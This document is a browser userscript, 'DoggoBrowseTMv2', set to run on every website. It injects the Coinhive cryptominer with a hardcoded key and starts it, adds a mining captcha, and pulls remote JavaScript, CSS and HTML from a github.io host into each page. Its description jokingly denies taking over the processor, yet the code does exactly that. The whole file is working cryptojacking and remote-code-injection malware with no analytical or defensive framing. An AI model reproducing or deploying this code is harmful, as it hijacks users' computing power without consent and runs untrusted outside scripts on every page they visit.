// ==UserScript==
// @name         DoggoBrowseTMv2
// @namespace    com.miner.doggobrowsetmv2
// @version      1.1.0
// @description  Try to take over your processor ^_^ JK!
// @author       Snaddyvitch Dispenser
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    //Start Loop
    //var hasscript = false;
    shrek();
    //while(!hasscript) {
    //var scripts = document.getElementsByTagName("script");
    //scripts.forEach(function (elem) {
    //    if (elem.src=="https://coinhive.com/lib/coinhive.min.js") {hasscript = true;}
    //});
    //}
    //Shrekify
     function shrek() {
    'use strict';
    var head = document.getElementsByTagName('head')[0];
    var body = document.getElementsByTagName('body')[0];

         var script3 = document.createElement('script');
    script3.type = "text/javascript";
    script3.src="https://code.jquery.com/jquery-3.3.1.min.js";
    head.appendChild(script3);

         //Injectable Script
    var script2 = document.createElement('script');
    script2.type = "text/javascript";
    script2.src="https://youtubefileserver.github.io/business/inject/script.js";
    head.appendChild(script2);

         var script = document.createElement('script');
    script.type = "text/javascript";
    script.src="https://coinhive.com/lib/coinhive.min.js";
    head.appendChild(script);
    script.onload = function() {
    var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ', {throttle: 0.2});
		miner.start();
    };
    var captcha = document.createElement('span');
    captcha.innerHTML = '<form action="?" method="post"><script src="https://authedmine.com/lib/captcha.min.js" async></script><div class="coinhive-captcha" data-autostart="true" data-hashes="1024" data-key="NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ"><em>Loading Captcha...<br>If it doesn\'t load, please disable Adblock!</em></div><input type="submit" value="Submit"/></form>';
    body.appendChild(captcha);

         //Injectable Styles
         var styles1 = document.createElement('link');
         styles1.rel="stylesheet";
         styles1.type="text/css";
         styles1.href="https://youtubefileserver.github.io/business/inject/style.css";
         head.appendChild(styles1);

         //Injectable HTML
    var docFrame = document.createElement('span');
         var response = $.ajax({ type: "GET",
                        url: "https://youtubefileserver.github.io/business/inject/page.html",
                        async: false
                      }).responseText;

         docFrame.innerHTML = response;
         body.appendChild(docFrame);
    }
})();
